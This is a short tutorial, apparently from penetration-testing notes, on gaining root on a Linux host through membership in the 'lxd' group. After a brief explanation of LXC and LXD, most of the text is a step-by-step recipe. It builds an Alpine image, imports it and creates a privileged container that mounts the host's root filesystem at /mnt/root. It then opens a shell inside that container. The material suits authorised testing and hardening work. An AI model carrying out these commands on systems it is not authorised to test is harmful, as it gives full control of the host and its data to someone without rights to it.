# Using LXD To Escalate Privileges 

## What is LXD and LXC?
* Linux Container (LXC) are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.

* Linux daemon (LXD) is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.

## What is an LXD Privesc?
A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.

LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.

## LXD API Host Mounting Privesc
One of them is to use the LXD API to mount the host’s root filesystem into a container which is going to use in this post. This gives a low-privilege user root access to the host filesystem.

## Instructional
In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following steps:

1. Attacker Machine:

	1. Download build-alpine in your local machine through the git repository.
	2. Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
	3. Transfer the tar file to the host machine 


2. Host Machine: 

	1. Download the alpine image
	2. Import image for lxd
	3. Initialize the image inside a new container.
	4. Mount the container inside the /root directory

1. git clone  https://github.com/saghul/lxd-alpine-builder.git
2. cd lxd-alpine-builder
3. ./build-alpine

On running the above command, a tar.gz file is created in the working directory that we have transferred to the host machine.

4. After the image has been transferred it can be added as an image to LXD as follows: lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
5. Then, you can check the images that have been imported into LXD using: lxc image list
6. Then start up the container:

	1. lxc init myimage ignite -c security.privileged=true
	2. lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
	3. lxc start ignite
	4. lxc exec ignite /bin/sh
	5. id

Once inside the container, navigate to /mnt/root to see all resources from the host machine.
